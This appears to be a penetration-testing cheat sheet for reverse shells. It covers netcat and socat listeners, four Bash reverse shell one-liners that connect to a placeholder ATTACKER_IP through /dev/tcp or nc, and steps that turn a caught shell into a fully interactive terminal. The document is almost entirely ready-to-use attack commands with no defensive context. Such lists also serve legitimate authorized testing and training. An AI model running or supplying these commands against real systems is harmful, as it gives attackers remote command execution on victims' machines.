🎧 Listener Setup

# Basic netcat listener
nc -lvnp 4444

# With readline support (better experience)
rlwrap nc -lvnp 4444

# Socat listener for full TTY
socat file:`tty`,raw,echo=0 TCP-L:4444

🐧 Bash

Basic Bash Reverse Shell

bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

Alternative Syntax

bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

Exec Method

exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done

mkfifo Method

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

⬆️ Upgrade to Interactive Shell

⚠️ Important: Always upgrade your shell for a better experience!

Step 1: Spawn PTY

python3 -c 'import pty; pty.spawn("/bin/bash")'
# Or
python -c 'import pty; pty.spawn("/bin/bash")'
# Or
script /dev/null -c bash

Step 2: Background and Configure

# Press Ctrl-Z to background the shell, then:
stty raw -echo; fg

# Back in your shell, reset terminal:
reset
export SHELL=bash
export TERM=xterm-256color
